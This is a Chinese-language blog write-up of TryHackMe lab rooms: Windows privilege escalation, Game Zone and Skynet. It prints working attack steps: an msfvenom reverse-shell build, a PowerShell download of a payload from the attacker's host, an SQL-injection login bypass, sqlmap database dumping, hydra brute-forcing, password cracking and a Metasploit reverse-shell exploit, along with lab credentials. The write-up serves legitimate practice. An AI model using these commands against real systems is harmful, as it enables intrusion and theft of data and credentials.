<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839677.png" alt="image-20240406130225685"></p>
<h2 id="没有-metasploit-的权限升级">没有 Metasploit 的权限升级</h2>
<p>在这个任务中，我们将在不使用 meterpreter/metasploit 的情况下升级我们的权限！</p>
<p>首先，我们将从我们已经建立的 netcat 会话转向更稳定的反向 shell。一旦我们确定了这一点，我们将使用winPEAS来枚举系统的潜在漏洞，然后再使用此信息上报给管理员。</p>
<pre><code class="hljs scss">msfvenom -<span class="hljs-selector-tag">p</span> windows/shell_reverse_tcp LHOST=<span class="hljs-number">10.11</span><span class="hljs-selector-class">.81</span><span class="hljs-selector-class">.232</span> LPORT=<span class="hljs-number">8888</span> -e x86/shikata_ga_nai -f exe -o shell<span class="hljs-selector-class">.exe</span></code></pre>
<pre><code class="hljs scss">powershell -c wget "http://<span class="hljs-number">10.11</span>.<span class="hljs-number">81.232</span>:<span class="hljs-number">81</span>/reverse.exe<span class="hljs-string">" -outfile reverse.exe</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839678.png" alt="image-20240406131437100"></p>
<p>最终成功拿到</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839679.png" alt="image-20240406131509575"></p>
<h2 id="总结">总结</h2>
<p>这里依旧是针对web站点的漏洞，首先测试发现存在可以暴力破解的html表单，使用hydra破解之后，发现该站点的组件存在漏洞，利用漏洞利用描述方法，nc监听拿到shell，之后就转换为meterpreter shell（老生常谈了，不赘述）然后上传winPEAS.exe发现存在服务配置缺陷，不过这里还有点东西的，因为你可以看到该服务目录下存在多个exe，无法判断该服务运行的是谁，因此需要到events，看一下该服务的运行日志发现了其运行exe，之后就明确了。</p>
<h1 id="0x07-game-zone挑战">0x07 Game Zone挑战</h1>
<p>本会议室将介绍 SQLi（手动和通过 SQLMap 利用此漏洞）、破解用户哈希密码、使用 SSH 隧道揭示隐藏服务以及使用 metasploit 有效负载获得 root 权限。</p>
<p>这里反向图片识别，发现该图片的人物名字为agent 47</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839680.png" alt="image-20240407112224764"></p>
<h2 id="通过sqli获取访问权限">通过SQLi获取访问权限</h2>
<p>在本小节中，你将更多地了解 SQL（结构化查询语言）以及如何潜在地操纵查询语句以便与数据库进行通信。</p>
<p>SQL 是一种标准语言，用于在数据库中存储、编辑和检索数据。 SQL查询语句可能如下所示：</p>
<p><strong>SELECT  FROM users WHERE username = ‘username’ AND password = ‘password’</strong></p>
<p>在目标靶机后台，当你尝试登录目标站点时，它会从登录页的用户名输入框和密码输入框中获取你所输入的值，然后将这些值直接插入到上面的查询语句中。 如果该查询语句找到有效数据得以匹配，你将被允许登录目标站点，否则将在登录页面上显示一条错误消息提示。</p>
<p>这是一个潜在的漏洞位置（登录框），因为你可以输入你所构造的用户名–将用户名构造为SQL 查询语句，这将写入、拼接并执行查询操作。</p>
<p>我们可以使用在上面学到的知识，在没有任何合法凭据的情况下操纵查询语句并实现登录行为。如果我们输入用户名 admin，输入密码<code>' or 1=1 #</code> 它会将密码中的值插入到后端查询语句中并验证我们的会话是否有效。</p>
<p>现在在 Web 服务器上执行的具体 SQL 查询如下：</p>
<p><strong>SELECT * FROM users WHERE username = ‘admin’ AND password =’ ’ or 1=1 # ’</strong></p>
<p>我们作为密码输入的额外SQL语句（<code>' or 1=1 #</code>）将会更改目标后端的初始查询为上述语句，这将中断初始查询过程并在 <strong>1==1</strong> 时继续（此时是管理员用户身份），然后我们将注释该查询的后接部分（使用**–**符号进行注释）以阻止SQL查询中断。</p>
<p>即使目标靶机的数据库中没有管理员用户，你仍然可以使用我们在上面所提到的值（<code>' or 1=1 #</code>）在不知道任何凭据的情况下完成登录。在登录页面，我们可以使用<code>' or 1=1 #</code>作为登录的用户名并将密码框一栏直接留空。</p>
<p>这里我在用户名的地方输入’ or 1=1 #，成功跳转</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839681.png" alt="image-20240407113532899"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839682.png" alt="image-20240407114158478"></p>
<h2 id="使用sqlmap">使用SQLmap</h2>
<p>SQLMap 是一种流行的开源自动 SQL 注入和数据库接管工具，它预装在所有版本的 Kali Linux 上，当然你也可以手动下载和安装SQLMap工具。</p>
<p>在web安全领域有许多不同类型的 SQL 注入（比如基于布尔的注入、基于时间的注入等），而SQLMap 工具将尝试使用不同的技术自动化整个注入过程。</p>
<p>我们将使用 SQLMap 针对目标靶机转储它的整个数据库–使用我们之前登录的页面，我们将 SQLMap 指向目标站点的评论搜索功能。</p>
<p>首先，我们需要使用 BurpSuite 拦截对目标站点的搜索功能的请求。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839683.png" alt="image-20240407114558876"></p>
<p>接着将上述内容cv到一个文件夹中，然后我们再将其传递给 SQLMap工具 以使用我们已经经过身份验证的用户会话。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839684.png" alt="image-20240407114619086"></p>
<blockquote>
<p>sqlmap -r request.txt --dbms=mysql --dump</p>
</blockquote>
<p><strong>-r</strong> 读取之前已保存的burpsuite所拦截的请求信息<br>
<strong>–dbms</strong> 告诉 SQLMap 目标是什么类型的数据库管理系统<br>
<strong>–dump</strong> 尝试转储整个数据库数据（真实环境下请谨慎使用dump参数）</p>
<p>输入以上命令之后，将在终端启动SQLMap 并尝试使用不同的注入方法以验证一些易受攻击的漏洞，最终，它将会输出目标数据库中的数据信息到终端界面。</p>
<pre><code class="hljs scss">POST /portal<span class="hljs-selector-class">.php</span> HTTP/<span class="hljs-number">1.1</span>
Host: <span class="hljs-number">10.10</span>.<span class="hljs-number">63.45</span>
User-Agent: Mozilla/<span class="hljs-number">5.0</span> (X11; Linux x86_64; rv:<span class="hljs-number">109.0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">115.0</span>
Accept: text/html,application/xhtml+xml,application/xml;<span class="hljs-selector-tag">q</span>=<span class="hljs-number">0.9</span>,image/avif,image/webp,*<span class="hljs-comment">/*;q=0.8</span>
<span class="hljs-comment">Accept-Language: en-US,en;q=0.5</span>
<span class="hljs-comment">Accept-Encoding: gzip, deflate, br</span>
<span class="hljs-comment">Content-Type: application/x-www-form-urlencoded</span>
<span class="hljs-comment">Content-Length: 15</span>
<span class="hljs-comment">Origin: http://10.10.63.45</span>
<span class="hljs-comment">Connection: close</span>
<span class="hljs-comment">Referer: http://10.10.63.45/portal.php</span>
<span class="hljs-comment">Cookie: PHPSESSID=2ggt1pm0albmt14khadge49ne0</span>
<span class="hljs-comment">Upgrade-Insecure-Requests: 1</span>
<span class="hljs-comment"></span>
<span class="hljs-comment">searchitem=test</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839685.png" alt="image-20240407121526811"></p>
<p>这里还是重换了一个靶机，刚开始的扫不出来漏洞。。。这里发现密码可以直接爆破出来</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839686.png" alt="image-20240407121721299"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839687.png" alt="image-20240407121758514"></p>
<h2 id="使用-johntheripper-破解密码">使用 JohnTheRipper 破解密码</h2>
<p>我们需要学会使用工具来装13</p>
<p>开膛手约翰 (JTR) 是一种快速、免费且开源的密码破解程序，这个工具预装在所有 Kali Linux 机器上。我们将使用JTR程序来破解我们之前获得的哈希密码值， JohnTheRipper 已有 15 年历史，当然还有一些其他密码破解程序例如 HashCat等。</p>
<p>JohnTheRipper程序的工作原理是先获取一个密码单词表，然后用指定的hash算法对其进行散列处理，再将其与目标散列密码（hash密码值）进行比较，如果两个散列密码相同，则表示已找到目标散列密码所对应的明文密码–即破解成功。因为我们不能直接反转目标散列值来得到明文密码，所以我们需要通过比较散列值来完成对目标hash值的猜解过程。</p>
<p>在本地攻击机上安装 JohnTheRipper 后，你可以使用以下参数针对目标哈希进行破解：</p>
<pre><code class="hljs scss">john <span class="hljs-attr">--wordlist</span>=/usr/share/wordlists/rockyou<span class="hljs-selector-class">.txt</span> hash<span class="hljs-selector-class">.txt</span> <span class="hljs-attr">--format</span>=Raw-SHA256</code></pre>
<blockquote>
<p>–wordlist - 是你用来破解目标哈希值的密码单词列表</p>
<p>hash.txt - 包含目标哈希值的列表（在一般情况下它的内容只是 1 个哈希值）</p>
<p>–format - 指明将要使用的散列算法类型，在上面的命令中，它表示使用 SHA256 算法进行哈希处理。</p>
</blockquote>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839688.png" alt="image-20240407122235877"></p>
<pre><code class="hljs scss">ssh agent47@<span class="hljs-number">10.10</span>.<span class="hljs-number">63.45</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839689.png" alt="image-20240407122431044"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839690.png" alt="image-20240407122441796"></p>
<h2 id="使用反向-ssh-隧道暴露目标隐藏服务">使用反向 SSH 隧道暴露目标隐藏服务</h2>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839691.png" alt="image-20240407122529757"></p>
<p>反向 SSH 端口转发能够 指定将远程服务器主机上的给定端口转发到本地端的给定主机和端口。</p>
<blockquote>
<p>-L 是本地隧道 (YOU &lt;-- CLIENT 由远程客户端到你的本地机)。 如果某个站点被阻止，你可以将流量转发到你所拥有的服务器上并查看它。</p>
<p>例如，如果站点imgur在工作中被阻止，你可以执行 <code>ssh -L 9000:imgur.com:80 user@example.com</code>，然后在你的本地机器上访问 <code>localhost:9000</code>，这将使用你所拥有的其他服务器加载站点imgur的流量。</p>
<p>-R 是远程隧道（YOU --&gt; CLIENT 由你的本地机到远程客户端）。 这意味着你将流量转发到另一台服务器以供其他人查看，该过程与上面的本地隧道示例类似，但加载流量的结果相反。</p>
</blockquote>
<p>我们将使用一个名为 ss 的工具来调查主机上所运行的套接字（socket ），如果我们运行命令 <code>ss -tulpn</code> 它将告诉我们主机上正在运行哪些套接字（socket ）连接。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839692.png" alt="image-20240407122813562"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839693.png" alt="image-20240407122825272"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839694.png" alt="image-20240407123154394"></p>
<p>接着我们访问本地10000端口即可</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839695.png" alt="image-20240407123251186"></p>
<p>这里利用agent47用户密码登录即可查看</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839696.png" alt="image-20240407123744679"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839697.png" alt="image-20240407123725264"></p>
<h2 id="提升权限到root">提升权限到root</h2>
<p>根据CMS版本，使用 Metasploit 搜索能够针对目标机器执行的有效负载 即payload。</p>
<p>启动msf，搜索可用模块。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839698.png" alt="image-20240407124147846"></p>
<p>设置参数并执行payload。</p>
<pre><code class="hljs scss">set PAYLOAD payload/cmd/unix/reverse
options
set USERNAME agent47
set PASSWORD videogamer124
set RHOSTS <span class="hljs-number">127.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>
set LHOST <span class="hljs-number">10.13</span><span class="hljs-selector-class">.16</span><span class="hljs-selector-class">.58</span> #攻击机所使用的连接至TryHackMe平台的内部vpn ip地址
set SSL false
exploit</code></pre>
<p>/root/root.txt下</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839699.png" alt="image-20240407130611186"></p>
<h2 id="总结">总结</h2>
<p>针对web站点的登录框功能，采用了sql注入的万能密码，也是成功进入，之后针对其中的数据查询功能，采用SQLmap判断其中是否存在sql注入（post注入），最后dump出了用户名和密码，采用john工具解密出了密码，然后ssh远程登录。</p>
<p>随后ss -tulpn看到当前tcp套字连接情况，随后看到10000端口不出网，尝试ssh本地端口转发，使得我们可以从本地访问该端口，成功访问之后，采用用户名密码登录进去，发现存在webmin cms漏洞，接着就是常规msf  exploit的利用。</p>
<h1 id="0x08-skynet挑战">0x08 Skynet挑战</h1>
<pre><code class="hljs scss">nmap -T5 -sC -sV -<span class="hljs-selector-tag">p</span>- <span class="hljs-number">10.10</span><span class="hljs-selector-class">.187</span><span class="hljs-selector-class">.5</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839700.png" alt="image-20240412160321361"></p>
<p>这里看到139与445端口的开放，尝试枚举一下smb看一下共享的文件有哪些（这里无密码即可）</p>
<pre><code class="hljs scss">smbclient -L \\<span class="hljs-number">10.10</span><span class="hljs-selector-class">.187</span><span class="hljs-selector-class">.5</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839701.png" alt="image-20240412170044530"></p>
<p>看到匿名用户anonymous文件夹，继续访问看一下该文件夹下存在什么</p>
<pre><code class="hljs scss">smbclient <span class="hljs-comment">//10.10.187.5/anonymous</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839702.png" alt="image-20240412171413067"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839703.png" alt="image-20240412171827458"></p>
<p>之后进入logs查看日志文件，发现log2.txt含有相关密码信息</p>
<pre><code class="hljs scss">cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
<span class="hljs-number">79</span>terminator6
<span class="hljs-number">1996</span>terminator</code></pre>
<p>这里没思路了，看了wp是去找web站点的可疑点了，gobuster扫目录，发现squirrelmail可疑目录</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839704.png" alt="image-20240412180741192"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839705.png" alt="image-20240412180110988"></p>
<p>这里是个邮件登录系统，可以联想到之前的邮件用户名，使用hydra爆破一下看看</p>
<pre><code class="hljs scss">hydra -l milesdyson -<span class="hljs-selector-tag">P</span> log1<span class="hljs-selector-class">.txt</span> <span class="hljs-number">10.10</span><span class="hljs-selector-class">.187</span><span class="hljs-selector-class">.5</span> http-<span class="hljs-selector-tag">form</span>-post "/squirrelmail/<span class="hljs-attribute">src</span>/redirect<span class="hljs-selector-class">.php</span>:login_username=milesdyson&amp;secretkey=^PASS^&amp;js_autodetect_results=<span class="hljs-number">1</span>&amp;just_logged_in=<span class="hljs-number">1</span>:Unknown user or password incorrect<span class="hljs-string">"</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839706.png" alt="image-20240412180831419"></p>
<p>成功得到密码<code>milesdyson:cyborg007haloterminator</code></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839707.png" alt="image-20240412181143021"></p>
<p>登录进去之后看到了smb密码重置，里面是当前smb服务密码：</p>
<pre><code class="hljs scss">)s{<span class="hljs-selector-tag">A</span>&amp;<span class="hljs-number">2</span>Z=F^n_E<span class="hljs-selector-class">.B</span>`</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839708.png" alt="image-20240412181214938"></p>
<p>这里联想到登录前面的smb共享账户milesdyson</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839709.png" alt="image-20240412181653781"></p>
